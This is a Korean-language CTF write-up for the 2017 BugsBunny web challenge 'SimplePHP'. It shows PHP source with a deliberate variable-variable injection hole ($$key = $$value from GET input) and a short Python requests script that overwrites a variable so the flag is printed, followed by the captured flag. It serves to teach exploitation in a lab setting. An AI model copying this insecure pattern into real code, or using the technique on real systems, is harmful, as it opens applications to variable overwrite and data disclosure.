# 2017 BugsBunny - [WEB] SimplePHP

## Key words

- reference variable
- variable's variable

## Solution

문제에 소스를 제공해주기 때문에 소스를 확인해봅니다.

```php
<?php

include "flag.php";

$_403 = "Access Denied";
$_200 = "Welcome Admin";

if ($_SERVER["REQUEST_METHOD"] != "POST")
    die("BugsBunnyCTF is here :p...");

if ( !isset($_POST["flag"]) )
    die($_403);


foreach ($_GET as $key => $value)
    $$key = $$value;

foreach ($_POST as $key => $value)
    $$key = $value;


if ( $_POST["flag"] !== $flag )
    die($_403);


echo "This is your flag : ". $flag . "\n";
die($_200);

?>
```

Flag를 출력하는 조건은 다음과 같습니다.

- POST Method
- GET, POST에 각각 `flag` 파라미터가 존재
- POST[flag]가 $flag 비교

간단하게 GET과 POST의 flag 파라미터에 '1'을 넣고 전달하면 `This is your flag ...`를 보는 것은 간합니다. 하지만 우리가 넣은 flag 때문에 원본이 지워집니다.

다시 위로 올라가 `foreach ($_GET as $key => $value) $$key = $$value;` 를 봅니다.

변수명에 `$`가 하나씩 더 붙어 있는데 이는 `reference variable`또는 `variable's variable`이라 불리는 가변 변수 입니다.

`$value = "flag"`를 넣게 되면 `$$value = $($value) = $flag`이런식으로 변수 명을 가변적으로 사용 할 수 있습니다.

따라서, 해결 소스는 다음과 같습니다.

## Solution Code

```python
import requests

url    = "http://34.253.165.46/SimplePhp/index.php"
data   = { "flag": "1" }
params = {"_200": "flag"}

r = requests.post(url, data=data, params=params)
print r.content
```

## Result

```
This is your flag : 1
Bugs_Bunny{Simple_PHP_1s_re4lly_fun_!!!}
```